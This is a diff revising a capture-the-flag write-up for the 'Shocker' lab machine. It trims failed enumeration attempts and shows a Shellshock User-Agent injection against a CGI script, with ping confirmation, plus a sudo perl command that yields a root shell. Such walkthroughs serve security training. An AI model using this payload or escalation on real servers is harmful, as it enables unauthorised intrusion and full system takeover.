@@ -35,44 +35,12 @@ We send an OPTIONS request using burp but we don't get any new info, just the al
 
 No luck so far. We try to analyse whether apache is vulnerable somehow.  
 We don't find any specific vulnerabilities on exploit DB. However the name of the machine is Shocker, so, what about a shellshoke?  
-We use the nmap http-shellshock script to scan for the vulnerability
-```
->nmap -sV -p80 --script http-shellshock -oN nmap-shellshock 10.10.10.56
-PORT   STATE SERVICE VERSION
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-```
-The script does not find any shellshock vulnerabilities. We take a closer look at the script on the NMAP web page and see find the following sentence: "To detect this vulnerability the script executes a command that prints a random string and then attempts to find it inside the response body. Web apps that don't print back information won't be detected with this method. "  
-It may be possible that the webserver doesn't print the result of the remote code execution on the response. We can try a blind injection and see if the shellshock actually takes place.  
-We intercept the HTTP request to the webserver and we play with the headers.  
-The attack vector used is 
-```
-() { :;}; ping -c 2 10.10.14.25
-```
-We try it as user agent and referer first, but no luck. We also try with other header fields but nope.  
-We are quite sure the vulnerability is not in SSH because you'd need to authenticate for a shellshock attack to it.  
-We restart with enumeration, hoping to find something new.  
-We run gobuster again with a bigger dictionary
-```
-gobuster dir -u http://10.10.10.56 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 25 -o gobuster_ext.out
-```
-No results save for the ones we already have.
 
-We run niko with the shellshocke plugin
-```
-nikto --host 10.10.10.56 -Plugins shellshock -o nikto-shellshock.txt
-```
-Nothing found. I suppose the script works the same as the nmap one.
+The vulnerability can affect apache servers with CGI scipts enabled. A recurrent directory where the cgi scripts are stored is /cgi-bin/. However gobuster hasn't found any directory at all (expect /server-status), even if cgi-bin is listed in the dictionary. We try to enter /cgi-bin/ manually and it magically worked.  
+What happened to gobuster then? It tried /cgi-bin which returns a 404 and not /cgi-bin/ which returns a 403. The -f flag in gobuster would have found the directory in a couple of seconds.  
 
-We fired up as much gobuster instances as possible. I try to to fuzz with different extensions: php,txt,html,sh,bash,cgi.  
-To look at status codes. It  may be possible that gobuster does not log the result we want because it has a different status code than the default ones. Therefore I use gobuster with the negative status code flag (-b 404). In this way it prints every resource it finds with status code different than 404.  
-
-There is something that we're missing so far: 
-By looking at  shellshock in Internet, we can see that a recurrent directory is /cgi-bin/. Even if this directory is listed in the dictionary file we used, we try to enter it manually (Yes, I was desperate at this point, couldn't find my way in :(  ). It magically worked.  
-Why did gobuster haven't found it? Because it tried /cgi-bin which returns a 404 and not /cgi-bin/ which returns a 403. The -f flag in gobuster would have found the directory in a couple of seconds.  
-
-Now we have a new road to follow and it seems very promising.  
-We can now scan inside the directory for the specific file extensions we expect to see.
+Now we have a clear road to follow and it seems very promising.  
+We can scan inside the directory for the specific file extensions we expect to see.
 ```
 gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 30 -x cgi,sh,bash,pl   -o gobuster_file.out
 ```
@@ -85,7 +53,7 @@ Just an uptime test script
  06:58:54 up 8 min,  0 users,  load average: 0.06, 0.08, 0.07
 ```
 
-Always keeping in mind the title of the machine, we try a shellshock attack on this. We inject our vector in the User Agent field:
+We try a shellshock attack on this script. We inject our vector in the User Agent field:
 ```
 GET /cgi-bin/user.sh HTTP/1.1
 Host: 10.10.10.56
@@ -108,7 +76,7 @@ Accept-Encoding: gzip, deflate
 Connection: close
 Upgrade-Insecure-Requests: 1
 ```
-We reveice the ping:
+We receive the ping:
 ```
 13:11:43.927461 IP 10.10.10.56 > 10.10.14.25: ICMP echo request, id 1563, seq 1, length 64
 13:11:43.927510 IP 10.10.14.25 > 10.10.10.56: ICMP echo reply, id 1563, seq 1, length 64
@@ -142,6 +110,3 @@ sudo -u root perl -e 'exec "/bin/sh";'
 >>>> whoami
 root
 ```
-
-
-MORAL OF THE STORY: My enumeration was shitty and I spend hours trying to exploit a non-existing shellshock vulnerability on a html file...
